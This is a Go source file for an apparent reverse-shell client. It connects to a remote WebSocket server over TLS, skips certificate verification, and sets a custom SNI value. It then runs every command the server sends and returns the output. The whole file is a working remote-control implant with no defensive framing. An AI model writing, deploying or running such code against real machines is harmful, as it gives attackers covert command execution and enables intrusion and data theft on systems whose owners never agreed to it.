package main

import (
	"crypto/tls"
	"fmt"
	"log"
	"os"
	"os/exec"

	"github.com/gorilla/websocket"
)

func main() {
	var targetIP string
	var targetPort string
	var sniValue string

	if len(os.Args) != 4 {
		fmt.Println("Usage: ./client <target_ip> <target_port> <sni_value>")
		os.Exit(1)
	}

	targetIP = os.Args[1]
	targetPort = os.Args[2]
	sniValue = os.Args[3]

	tlsConfig := &tls.Config{
		InsecureSkipVerify: true,
		ServerName:         sniValue,
	}

	dialer := websocket.Dialer{
		TLSClientConfig: tlsConfig,
	}

	url := fmt.Sprintf("wss://%s:%s/ws", targetIP, targetPort)
	conn, _, err := dialer.Dial(url, nil)
	if err != nil {
		log.Fatal("Error connecting to WebSocket server:", err)
	}
	defer conn.Close()

	for {
		// Read command from server
		_, message, err := conn.ReadMessage()
		if err != nil {
			log.Println("Error reading command:", err)
			break
		}

		// Execute the command
		output, err := exec.Command(string(message)).Output()
		if err != nil {
			output = []byte(fmt.Sprintf("Error executing command: %s", err))
		}

		// Send output back to server
		err = conn.WriteMessage(websocket.TextMessage, output)
		if err != nil {
			log.Println("Error sending output:", err)
			break
		}
	}
}
